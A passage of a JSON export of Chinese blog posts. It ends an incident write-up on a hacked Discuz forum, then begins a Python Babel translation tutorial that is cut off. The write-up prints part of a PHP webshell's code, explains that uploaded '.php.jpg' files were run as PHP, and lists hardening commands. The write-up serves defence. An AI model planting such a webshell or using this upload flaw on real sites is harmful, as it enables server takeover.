style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_array(<\/span>$<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'option'<\/span>])) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'nokey'<\/span>]) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span> ($<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'option'<\/span>] <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">value<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'selected'<\/span>]==$<span style=\"color: #ffcc66;\">value<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;option value=\\\"$value\\\" selected&gt;$value&lt;\/option&gt;\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;option value=\\\"$value\\\"&gt;$value&lt;\/option&gt;\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span> ($<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'option'<\/span>] <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">key<\/span>=&gt;$<span style=\"color: #ffcc66;\">value<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'selected'<\/span>]==$<span style=\"color: #ffcc66;\">key<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;option value=\\\"$key\\\" selected&gt;$value&lt;\/option&gt;\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;option value=\\\"$key\\\"&gt;$value&lt;\/option&gt;\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;\/select&gt;\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'newline'<\/span>]) <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/p&gt;'<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">formhead<\/span>($<span style=\"color: #ffcc66;\">arg<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">self<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'method'<\/span>] &amp;&amp; $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'method'<\/span>] = <span style=\"color: #66cccc;\">'post'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'action'<\/span>] &amp;&amp; $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'action'<\/span>] = $<span style=\"color: #ffcc66;\">self<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'target'<\/span>] = $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'target'<\/span>] ? <span style=\"color: #66cccc;\">\"target=\\\"$arg[target]\\\"\"<\/span> : <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'name'<\/span>] &amp;&amp; $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'name'<\/span>] = <span style=\"color: #66cccc;\">'form1'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;form name=\\\"$arg[name]\\\" id=\\\"$arg[name]\\\" action=\\\"$arg[action]\\\" metho<\/span><span style=\"color: #66cccc; text-decoration: underline;\">d=\\\"$arg[method]\\\" $arg[target]&gt;\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'title'<\/span>]) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;'<\/span>.$<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'title'<\/span>].<span style=\"color: #66cccc;\">' &amp;raquo;&lt;\/h2&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">maketext<\/span>($<span style=\"color: #ffcc66;\">arg<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'cols'<\/span>] &amp;&amp; $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'cols'<\/span>] = <span style=\"color: #cccccc; background-color: #2d2d2d;\">100<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'rows'<\/span>] &amp;&amp; $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'rows'<\/span>] = <span style=\"color: #cccccc; background-color: #2d2d2d;\">25<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'title'<\/span>] = $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'title'<\/span>] ? $<span style=\"color: #ffcc66;\">arg<\/span>[<span style=\"color: #66cccc;\">'title'<\/span>].<span style=\"color: #66cccc;\">'&lt;br \/&gt;'<\/span> : <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;p&gt;$arg[title]&lt;textarea class=\\\"area\\\" id=\\\"$arg[name]\\\" name=\\\"$arg[name<\/span><span style=\"color: #66cccc; text-decoration: underline;\">]\\\" cols=\\\"$arg[cols]\\\" rows=\\\"$arg[rows]\\\" $arg[extra]&gt;$arg[value]&lt;\/textarea&gt;&lt;\/p&gt;\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">formfooter<\/span>($<span style=\"color: #ffcc66;\">name<\/span> = <span style=\"color: #66cccc;\">''<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">name<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">name<\/span> = <span style=\"color: #66cccc;\">'submit'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;&lt;input class=\"bt\" name=\"'<\/span>.$<span style=\"color: #ffcc66;\">name<\/span>.<span style=\"color: #66cccc;\">'\" id=\"'<\/span>.$<span style=\"color: #ffcc66;\">name<\/span>.<span style=\"color: #66cccc;\">'\" type=\"submit\" value=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"Submit\"&gt;&lt;\/p&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/form&gt;'<\/span>);\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">goback<\/span>(){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">self<\/span>, $<span style=\"color: #ffcc66;\">nowpath<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;form action=\"'<\/span>.$<span style=\"color: #ffcc66;\">self<\/span>.<span style=\"color: #66cccc;\">'\" method=\"post\"&gt;&lt;input type=\"hidden\" name=\"action\"<\/span><span style=\"color: #66cccc; text-decoration: underline;\"> value=\"file\" \/&gt;&lt;input type=\"hidden\" name=\"dir\" value=\"'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">nowpath<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\" \/&gt;&lt;p&gt;&lt;input class=\"bt\" type=\"submit\" value=\"Go back...\"&gt;&lt;\/p&gt;&lt;\/form&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">formfoot<\/span>(){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/form&gt;'<\/span>);\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">encode_pass<\/span>($<span style=\"color: #ffcc66;\">pass<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">pass<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">md5(<\/span><span style=\"color: #66cccc;\">'angel'<\/span>.$<span style=\"color: #ffcc66;\">pass<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">pass<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">md5(<\/span>$<span style=\"color: #ffcc66;\">pass<\/span>.<span style=\"color: #66cccc;\">'angel'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">pass<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">md5(<\/span><span style=\"color: #66cccc;\">'angel'<\/span>.$<span style=\"color: #ffcc66;\">pass<\/span>.<span style=\"color: #66cccc;\">'angel'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">pass<\/span>;\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">pr<\/span>($<span style=\"color: #ffcc66;\">s<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> <span style=\"color: #66cccc;\">\"&lt;pre&gt;\"<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">print_r(<\/span>$<span style=\"color: #ffcc66;\">s<\/span>).<span style=\"color: #66cccc;\">'&lt;\/pre&gt;'<\/span>;\n}\n\n<span style=\"color: #cc99cc;\">?&gt;<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u4e0a\u9762\u7684\u811a\u672c\u88ab\u6076\u610f\u7528\u6237\u5b8c\u6210\u5bf9\u7cfb\u7edf\u7684\u8fdc\u7a0b\u63a7\u5236\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">\u95ee\u9898\u6839\u6e90<\/h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<p>\n\u8fd9\u6b21\u53d1\u73b0\u7684\u6076\u610f\u4ee3\u7801\u6ce8\u5165\u5e94\u8be5\u662f\u4e4b\u524d\u7684\u4e00\u6b21 <code>nginx<\/code> \u548c <code>php<\/code> <a href=\"http:\/\/www.oschina.net\/translate\/10-tips-for-securing-nginx#translate_28443\">\u5b89\u5168\u6f0f\u6d1e<\/a> \u5f15\u8d77\uff0c\u5f53\u65f6\u7531 <code>WooYun.org<\/code> \u6c47\u62a5\uff0c\u539f\u6765\u5df2\u7ecf\u88ab\u6076\u610f\u7528\u6237\u79cd\u4e0b\u4e86\u8fd9\u4e9b\u540e\u95e8\u3002\n<\/p>\n\n<p>\n\u8fd9\u4e2a\u6f0f\u6d1e\u7b80\u8a00\u4e4b\u5c31\u662f\u7528\u6237\u53ef\u4ee5\u4e0a\u4f20\u6587\u4ef6\u540e\u7f00\u4e3a <code>.php.jpg<\/code> \u7684\u6587\u4ef6\uff0c\u5728\u5916\u90e8\u8bbf\u95ee\u65f6\u76f4\u63a5\u88ab\u5f53\u505a <code>php<\/code> \u6267\u884c\uff0c\u7f6a\u9b41\u7978\u9996\u5f52\u7ed3\u4e3a\u4ee5\u4e0b\u4e09\u70b9\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li><code>php<\/code> \u914d\u7f6e\n<\/li>\n\n<li><code>nginx<\/code> \u914d\u7f6e\n<\/li>\n\n<li><code>discuz<\/code>\n\n<p>\n\u5141\u8bb8\u4e0a\u4f20\u6587\u4ef6\u540d\u6307\u5b9a\u540e\u7f00\u4e3a <code>.php.jpg<\/code>\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">\u52a0\u56fa\u63aa\u65bd<\/h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<ul class=\"org-ul\">\n<li>\u91c7\u7528\u66f4\u4e25\u683c\u7684\u6587\u4ef6\u76ee\u5f55\u6743\u9650\n\n<ul class=\"org-ul\">\n<li>\u5217\u51fa\u5c5e\u4e3b\u4e0d\u5e94\u8be5\u4e3a <code>nobody<\/code> \u7684\u76ee\u5f55\uff1a\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">find . -type d  | xargs ls -lad | grep nobody | grep -v <span style=\"color: #66cccc;\">'\/data'<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u9664 <code>discuz<\/code> \u8981\u6c42\u4e3a\u53ef\u5199\u7684\u76ee\u5f55\uff08\u8def\u5f84\u540d\u5305\u542f\/data\uff09\u5916\uff0c\u5176\u5b83\u6240\u6709\u6587\u4ef6\u53ca\u76ee\u5f55\u5c5e\u4e3b\u90fd\u6539\u4e3a\u975e <code>nobody<\/code> \u7528\u6237\u3002\n<\/p>\n\n<p>\n\u9700\u8981\u6ce8\u610f\u7684\u662f <code>source\/plugin\/<\/code> \u4e0b\u7684\u6240\u6709\u76ee\u5f55\u9700\u8981\u4e3a\u6240\u6709\u7528\u6237\u6dfb\u52a0\u4e0a\u53ef\u6267\u884c\u6743\u9650\uff08\u7279\u522b\u662f\u81ea\u5df2\u5f00\u53d1\u5e76\u4e0a\u4f20\u89e3\u538b\u7684\u63d2\u4ef6\uff09\uff0c\u5426\u5219\u8bbf\u95ee\u63d2\u4ef6\u65f6\u4f1a\u51fa\u73b0\u4ee5\u4e0b\u9519\u8bef\u63d0\u793a\uff1a\n<\/p>\n\n<pre class=\"example\">\n         \u6307\u5b9a\u7684\u63d2\u4ef6\u6a21\u5757\u6587\u4ef6(XXXXXXXXXX)\u4e0d\u5b58\u5728\u6216\u5b58\u5728\u8bed\u6cd5\u9519\u8bef\uff0c\u8bf7\u68c0\u67e5\u662f\u5426\u5df2\u5c06\u63d2\u4ef6\u5b8c\u6574\u4e0a\u4f20\n<\/pre>\n<\/li>\n\n<li>\u5217\u51fa\u5c5e\u4e3b\u4e0d\u5e94\u8be5\u4e3a <code>nobody<\/code> \u7684\u6587\u4ef6\uff1a\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">find . -type f  | xargs ls -la | grep nobody | grep -v <span style=\"color: #66cccc;\">'\/data'<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u9664 <code>discuz<\/code> \u8981\u6c42\u4e3a\u53ef\u5199\u7684\u6587\u4ef6\uff08\u8def\u5f84\u540d\u5305\u542f\/data\uff09\u5916\uff0c\u5176\u5b83\u6240\u6709\u6587\u4ef6\u5c5e\u4e3b\u90fd\u6539\u4e3a\u975e <code>nobody<\/code> \u7528\u6237\u3002\n<\/p>\n<\/li>\n\n<li>\u5217\u51fa <code>nobody<\/code> \u53ef\u5199\u7684\u6587\u4ef6\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">find . -type f ! -perm 0644  | xargs ls -la | grep -v <span style=\"color: #66cccc;\">'\/data\/'<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u6536\u56de\u975e\u5fc5\u8981\u7684\u5199\u6743\u9650\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/li>\n\n<li>\u786e\u4fdd\u4e0a\u4f20\u76ee\u5f55\u4e2d\u7684 <code>php<\/code> \u6587\u4ef6\u4e0d\u4f1a\u88ab\u5f53\u505a <code>php<\/code> \u6267\u884c\n\n<ul class=\"org-ul\">\n<li>data\/attachment\n<\/li>\n<li>uc_server\/data\/avatar\n<\/li>\n<li>uc_server\/data\/tmp\n<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "python\u5e94\u7528\u56fd\u9645\u5316\uff1aBabel",
  "timestamp": "2014-03-09 19:54:00",
  "tags": [
    "python",
    "babel"
  ],
  "body": "<p>\n<a href=\"http:\/\/babel.pocoo.org\/\">Babel<\/a> \u662f <code>Python<\/code> \u7684\u4e00\u4e2a\u56fd\u9645\u5316\u5de5\u5177\u5305\uff0c\u539f\u672c\u4e3a<i>Edgewall.org<\/i>\u4e0b\u7684\u4e00\u4e2a\u9879\u76ee\uff0c\u73b0\u5728\u5df2\u7ecf\u8f6c\u4e3a\u7531<i>pocoo.org<\/i>\u7ef4\u62a4\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u7edf\u4e00\u7ba1\u7406 <code>Python<\/code> \u865a\u62df\u73af\u5883<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S python-virtualenvwrapper\nmkdir $<span style=\"color: #ffcc66;\">HOME<\/span>\/.virtualenvs\n<span style=\"color: #cc99cc;\">echo<\/span> <span style=\"color: #66cccc;\">'export WORKON_HOME=$HOME\/.virtualenvs'<\/span> &gt;&gt; ~\/.bashrc\n<span style=\"color: #cc99cc;\">echo<\/span> <span style=\"color: #66cccc;\">'source virtualenvwrapper.sh'<\/span> &gt;&gt; ~\/.bashrc\n<span style=\"color: #cc99cc;\">source<\/span> ~\/.bashrc\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5efa\u7acb\u5b66\u4e60 <code>Babel<\/code> \u4e13\u7528\u865a\u62df\u73af\u5883<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkvirtualenv --python=\/usr\/bin\/python2 --no-site-packages LearnBabel\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u7f16\u8bd1\u5b89\u88c5 <code>Babel<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone https:\/\/github.com\/mitsuhiko\/babel.git\n<span style=\"color: #cc99cc;\">cd<\/span> babel\npip install pytz\npython setup.py import_cldr\npip install --editable .\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u5e38\u7528\u4fe1\u606f\u56fd\u9645\u5316<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<pre class=\"example\">\n&gt;&gt;&gt; from babel import Locale\n&gt;&gt;&gt; locale = Locale('en', 'US')\n&gt;&gt;&gt; print locale.territories['CN']\nChina\n&gt;&gt;&gt; locale = Locale('zh')\n&gt;&gt;&gt; print locale.territories['CN']\n\u4e2d\u56fd\n&gt;&gt;&gt; month_names = locale.months['format']['wide'].items()\n&gt;&gt;&gt; for idx, name in sorted(month_names):\n...   print name\n... \n\u4e00\u6708\n\u4e8c\u6708\n\u4e09\u6708\n\u56db\u6708\n\u4e94\u6708\n\u516d\u6708\n\u4e03\u6708\n\u516b\u6708\n\u4e5d\u6708\n\u5341\u6708\n\u5341\u4e00\u6708\n\u5341\u4e8c\u6708\n&gt;&gt;&gt; from datetime import date\n&gt;&gt;&gt; from babel.dates import format_date\n&gt;&gt;&gt; today = date.today()\n&gt;&gt;&gt; print format_date(today, locale='zh')\n2014\u5e743\u67089\u65e5\n<\/pre>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">\u4efb\u610f\u4fe1\u606f\u56fd\u9645\u5316<\/h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<ul class=\"org-ul\">\n<li>\u521b\u5efapython\u7a0b\u5e8f\uff1a <code>hello.py<\/code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #99cc99;\">import<\/span> gettext\ngettext.bindtextdomain(<span style=\"color: #66cccc;\">'messages'<\/span>, <span style=\"color: #66cccc;\">'.\/hello.i18n'<\/span>)\n<span style=\"color: #ffcc66;\">_<\/span> = gettext.gettext\n<span style=\"color: #99cc99;\">print<\/span> _(<span style=\"color: #66cccc;\">'Hello'<\/span>)\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u521b\u5efaBabel\u914d\u7f6e\u6587\u4ef6\uff1a <code>hello.babel<\/code>\n\n<pre class=\"example\">\n[python: hello.py]\n<\/pre>\n<\/li>\n\n<li>\u51c6\u5907\u7ffb\u8bd1\u6210\u4e2d\u6587\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkdir hello.i18n\npybabel extract -F hello.babel . -o hello.i18n\/messages.pot    <span style=\"color: #999999; font-style: italic;\"># <\/span><span style=\"color: #999999; font-style: italic;\">&#20174;&#28304;&#20195;&#30721;&#20013;&#25552;&#21462;&#21487;&#32763;&#35793;&#30340;&#25991;&#26412;&#21040;P<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">OT&#65288;PO&#27169;&#26495;&#65289;&#25991;&#20214;<\/span>\npybabel init -l zh_CN -d .\/hello.i18n -i .\/hello.i18n\/messages.pot    <span style=\"color: #999999; font-style: italic;\"># <\/span><span style=\"color: #999999; font-style: italic;\">&#23558;POT&#25991;&#26412;&#25335;&#36125;<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">&#20986;&#19968;&#20221;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u8bd1\u6210\u4e2d\u6587\u540e\u7684PO\u6587\u4ef6\uff1a <code>.\/hello.i18n\/zh_CN\/LC_MESSAGES\/messages.po<\/code>\n\n<pre class=\"example\">\n# Chinese (Simplified, China) translations for PROJECT.\n# Copyright (C) 2014 ORGANIZATION\n# This file is distributed under the same license as the PROJECT project.\n# FIRST AUTHOR &lt;EMAIL@ADDRESS&gt;, 2014.\n#\n#, fuzzy\nmsgid \"\"\nmsgstr \"\"\n\"Project-Id-Version: PROJECT VERSION\\n\"\n\"Report-Msgid-Bugs-To: EMAIL@ADDRESS\\n\"\n\"POT-Creation-Date: 2014-03-09 19:08+0800\\n\"\n\"PO-Revision-Date: 2014-03-09 19:12+0800\\n\"\n\"Last-Translator: FULL NAME &lt;EMAIL@ADDRESS&gt;\\n\"\n\"Language-Team: zh_Hans_CN &lt;LL@li.org&gt;\\n\"\n\"Plural-Forms: nplurals=2; plural=(n != 1)\\n\"\n\"MIME-Version: 1.0\\n\"\n\"Content-Type: text\/plain; charset=utf-8\\n\"\n\"Content-Transfer-Encoding: 8bit\\n\"\n\"Generated-By: Babel 2.0-dev\\n\"\n\n#: hello.py:1\nmsgid \"Hello\"\nmsgstr \"\u5582\"\n<\/pre>\n<\/li>\n\n<li>\u7f16\u8bd1\u7ffb\u8bd1\u7ed3\u679c\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pybabel compile -f -d .\/hello.i18n    <span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">&#32534;&#35793;PO&#25991;&#20214;&#20026;MO&#25991;&#20214;<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u82f1\u6587\u73af\u5883\u4e0b\u8fd0\u884c\u7a0b\u5e8f\n\n<pre class=\"example\">\npython .\/hello.py\nHello\n<\/pre>\n<\/li>\n\n<li>\u4e2d\u6587\u73af\u5883\u4e0b\u8fd0\u884c\u7a0b\u5e8f\n\n<pre class=\"example\">\nLC_ALL=zh_CN python 